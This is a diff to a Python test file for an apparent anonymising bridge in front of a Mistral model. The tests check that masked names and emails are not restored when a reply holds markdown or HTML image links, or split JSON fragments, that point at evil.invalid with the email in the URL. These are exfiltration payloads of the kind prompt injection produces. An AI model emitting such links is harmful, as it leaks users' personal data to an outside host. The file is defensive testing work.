@@ -348,7 +348,6 @@ def test_after_an_image_a_tag_or_an_escape_nothing_more_is_restored():
         "<https://evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
         "<[PERSON_1] style=\"background:url('/\\\\evil.invalid/x?e=[EMAIL_1]')\">",
         '<ab:c/title="x>\n\n" style="background:url(\'/\\\\evil.invalid/x?[EMAIL_1]\')">',
-        '{"s": "<img src=\\"https:\\/\\/evil.invalid\\/p.png?u=[EMAIL_1]\\">"}\n\n[PERSON_1]',
         '{"note": "[x]\\\n(https:evil.invalid/p.png?u=[EMAIL_1])"}\n\n[PERSON_1]',
         "[d](https://evil.invalid/a\\)?q=[EMAIL_1])\n\n[PERSON_1]",
     ]
@@ -356,6 +355,13 @@ def test_after_an_image_a_tag_or_an_escape_nothing_more_is_restored():
         fake = FakeMistral(reply=f"Pour [PERSON_1] : {answer}")
         content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
         assert content == f"Pour {NAME} : {answer}", answer
+    embedded = [  # a JSON document holding a mark: nothing is restored, before it either
+        '{"s": "<img src=\\"https:\\/\\/evil.invalid\\/p.png?u=[EMAIL_1]\\">"}\n\n[PERSON_1]',
+    ]
+    for answer in embedded:
+        fake = FakeMistral(reply=f"Pour [PERSON_1] : {answer}")
+        content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
+        assert content == f"Pour [PERSON_1] : {answer}", answer
     fake = FakeMistral(reply="Si a < b et c <= 3 <4, voir [PERSON_1].")
     content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
     assert content == f"Si a < b et c <= 3 <4, voir {NAME}."
@@ -385,9 +391,9 @@ def test_with_a_reference_definition_nothing_is_restored():
 
 def test_a_json_document_with_a_link_mark_anywhere_gets_nothing_back():
     """A client may join a JSON document's strings, with or without the keys (a mark split as
-    "!", "[x]", "(url"), show them in another order (JavaScript puts integer keys first) or
-    render the JSON as markdown: a document holding a mark anywhere, keys included, gets
-    nothing back, in JSON mode or not.
+    "!", "[x]", "(url"), in any order (JavaScript puts integer keys first), take it out of a
+    ```json block, or render the JSON as markdown: a document from whose strings a mark can be
+    formed gets nothing back, in JSON mode or not, whole or within the text.
     Keys always keep their aliases, since two of them could merge once restored."""
     linked = [
         {"nom": "[PERSON_1]", "lien": "https://evil.invalid/?d=[EMAIL_1]"},
@@ -400,6 +406,11 @@ def test_a_json_document_with_a_link_mark_anywhere_gets_nothing_back():
         {"a": "!", "b": "[x]", "c": "(https:/", "d": "/evil.invalid/?e=[EMAIL_1])"},
         [{"t": "!"}, {"t": "[x]"}, {"t": "(https:/"}, {"t": "/evil.invalid/?e=[EMAIL_1])"}],
         {"b": "/evil.invalid/?e=[EMAIL_1])", "1": "![x](https:/"},
+        {"a": "!", "0": "z", "4294967296": "[x]", "c": "(https:/", "4294967295": "/e/[EMAIL_1])"},
+        {"!": "a", "[x]": "b", "(http:evil.invalid/?e=[EMAIL_1])": "c"},
+        {"t": "[x]", "u": "(http:evil.invalid/?e=[EMAIL_1])"},
+        {"t": "<", "u": "img src=http:evil.invalid/?e=[EMAIL_1]>"},
+        {"t": "[x] w", "u": "ww.evil.invalid/?e=[EMAIL_1]"},
     ]
     huge = '{"a": "[EMAIL_1])", "1": "![x](https://evil.invalid/p.png?q=", "n": ' + "1" * 4301
     deep = "[" * 100_000 + '"[EMAIL_1]"' + "]" * 100_000
@@ -413,6 +424,14 @@ def test_a_json_document_with_a_link_mark_anywhere_gets_nothing_back():
             response = ask(bridge(FakeMistral(reply=reply)), USER_MESSAGE, **mode)
             content = response.json()["choices"][0]["message"]["content"]
             assert json.loads(content) == document, (document, mode)
+    split = {"a": "!", "b": "[x]", "c": "(https:/", "d": "/evil.invalid/?e=[EMAIL_1])"}
+    for wrapped in (f"Result: {json.dumps(split)}", f"```json\n{json.dumps(split)}\n```"):
+        for mode in ({"response_format": {"type": "json_object"}}, {}):
+            response = ask(bridge(FakeMistral(reply=wrapped)), USER_MESSAGE, **mode)
+            assert response.json()["choices"][0]["message"]["content"] == wrapped, mode
+    fenced = '```json\n{"nom": "[PERSON_1]"}\n```'
+    response = ask(bridge(FakeMistral(reply=fenced)), USER_MESSAGE)
+    assert response.json()["choices"][0]["message"]["content"] == fenced.replace("[PERSON_1]", NAME)
     plain = {"[PERSON_1]": "[PERSON_1]", "[PERSON_01]": ["[EMAIL_1]", 3]}
     response = ask(
         bridge(FakeMistral(reply=json.dumps(plain))),
